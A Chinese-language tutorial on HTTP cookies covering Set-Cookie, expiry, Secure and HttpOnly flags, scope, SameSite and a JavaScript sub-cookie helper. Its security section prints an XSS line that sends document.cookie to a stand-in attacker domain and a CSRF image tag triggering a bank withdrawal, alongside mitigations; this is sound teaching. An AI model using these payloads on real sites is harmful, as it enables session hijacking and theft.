# 何为cookie
> HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。

## 应用
- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。

## 创建Cookie
- 当服务器收到HTTP请求时，服务器可以在响应头里面添加一个`Set-Cookie`选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

- Set-Cookie响应头部和Cookie请求头部

服务器使用Set-Cookie响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样：
> `Set-Cookie: <cookie名>=<cookie值>`
服务器通过该头部告知客户端保存Cookie信息。

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```
现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头部再发送给服务器。
```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

### 会话期Cookie
会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。

### 持久性Cookie
和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。
> `Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`
当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

### Cookie的Secure 和HttpOnly 标记
安全的Cookie只应通过HTTPS协议加密过的请求发送给服务端。即便设置了 Secure 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。

为避免跨域脚本 (`XSS`) 攻击，通过JavaScript的`Document.cookie` API无法访问带有 `HttpOnly` 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。

> `Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`

### Cookie的作用域
`Domain` 和 `Path` 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。

Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名。

例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。

Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 Path=/docs，则以下地址都会匹配：
```
/docs
/docs/Web/
/docs/Web/HTTP
```

### SameSite Cookies 
SameSite Cookie允许服务器指定在跨站请求时该Cookie是否会被发送，从而可以阻止跨站请求伪造攻击（`CSRF`）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。

### JavaScript通过Document.cookies访问Cookie
通过Document.cookie属性可创建新的Cookie，也可通过该属性访问非HttpOnly标记的Cookie。
```javascript
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```
请留意在安全节提到的安全隐患问题，JavaScript可以通过跨站脚本攻击（`XSS`）的方式来窃取Cookie。

## 安全
> 当机器处于不安全环境时，切记不能通过HTTP Cookie存储、传输敏感信息。

### 会话劫持和XSS

在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。

```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

### 跨站请求伪造（CSRF）
维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：
```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止XSS；
- 任何敏感操作都需要确认；
- 用于敏感信息的Cookie只能拥有较短的生命周期；
- 更多方法可以查看OWASP CSRF<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>。


### JS操作cookie
由于cookie的个数以及大小限制，出现了子cookie，它相当于cookie的一小段，格式可能类似下面这样： 
name=name1=”Liu”&name2=”Yang”&name3=”Chen” 
这就是一个名为name的cookie，但是它又有3个子cookie。 
同样也可以利用JS写一个设置cookie或获取cookie的通用方法，但是主要这时设置可以设置某个cookie选项，也可以设置某个cookie 选项中某一个子cookie的值
```javascript
var UtilCookie = {
    get : function(Cname, name){
        var data = this.getAllCookie(Cname);
        if(data[name])
            return data[name];
        else
            return false;
   },
   getAllCookie : function(cookieName){
       cookieName = cookieName + "=";
       var res = {};
       var CStart = document.cookie.indexOf(cookieName);
       if(CStart != -1)
       {
           var CEnd = document.cookie.indexOf(";", CStart);
           if(CEnd == -1)
           {
                CStartStr = document.cookie.substring( CStart + cookieName.length);
                var part = CStartStr.split("&");
                for(var i = 0; i < part.length; i++)
                {
                    var partP = part[i].split("=");
                    res[partP[0]] = partP[1];
                }

            }
            else
            {
                CStartStr = document.cookie.substring( CStart + cookieName.length, CEnd);
                var part = CStartStr.split("&");
                for(var i = 0; i < part.length; i++)
                {
                    var partP = part[i].split("=");
                    res[partP[0]] = partP[1];
                }
            }
            return res;
        }
        else
        {
            return false;
        }

    },
    setAll: function(Cname, subcookie, expires, path, domain, secure){
        var CText = encodeURIComponent(Cname) + "=";
        var Arr = [];
        for(subName in subcookie)
        {
            if(subName.length > 0 && subcookie.hasOwnProperty(subName))
            {
                Arr.push(encodeURIComponent(subName) + "=" + encodeURIComponent(subcookie[subName]));
            }
        }
        if(Arr.length > 0)
        {
            CText += Arr.join("&");
        }
        if(expires instanceof Date)
        {
            CText += ";expires=" + expires.toGMTString();
        }
        if(path)
        {
            CText += ";path=" + path;
        }
        if(domain)
        {
            CText += ";domain=" + domain;
        }
        if(secure)
        {
            CText += ";secure";
        }
        document.cookie = CText;
    },
    set : function(name, subName, value, expires, domain, path, secure){
        var subcookie = this.getAllCookie(name);
        subcookie[subName] = value;
        this.setAll(name, subcookie, expires, path, domain, secure);
    },
    removeCookie: function(name){
    //删除cookie时将其过期时间设为过去的一个时间就可以了
        this.set(name, '', new Date(0));
    }
}
//子cookie的格式： name=name1="Liu"&name2="Hellen"&name3="Yang";

UtilCookie.setAll( "name", { name1:"Liu", name2:"Yang", family:"YL" });
UtilCookie.get("name", "name1");

```

### 文章参考
- <https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies>
- <http://blog.csdn.net/u010046318/article/details/72791786>